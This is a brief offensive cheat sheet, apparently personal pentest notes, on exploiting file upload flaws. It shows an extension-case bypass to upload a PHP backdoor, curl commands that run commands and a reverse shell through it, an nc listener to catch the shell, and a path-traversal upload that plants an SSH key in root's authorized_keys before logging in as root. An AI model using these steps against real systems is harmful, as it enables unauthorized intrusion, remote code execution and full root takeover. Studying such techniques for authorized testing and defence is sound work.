# File Upload Vulnerabilities

__REQUIRES__

 - Mechanism to upload files

## Using Executable Files

File name alterations for bypass of controls
```text
simple-backdoor.pHP
```

File usage
```bash
curl http://example.local/meteor/uploads/simple-backdoor.pHP?cmd=dir
```

pwsh rshell (shell in resources)
```bash
curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=<rshell from notes>
```

catch shell
```bash
nc -nvlp 4444
```

## Using Non-Executable Files

```text
Always analyze uploads with BurpSuite, they can leak file locations
```

As an example you could generate an ssh key and upload it as a key for the root user
```bash
ssh-keygen
cat fileup.pub > authorized_keys

../../../../../../../root/.ssh/authorized_keys
```

ssh into device
```bash
ssh -p 2222 -i fileup root@example.local
```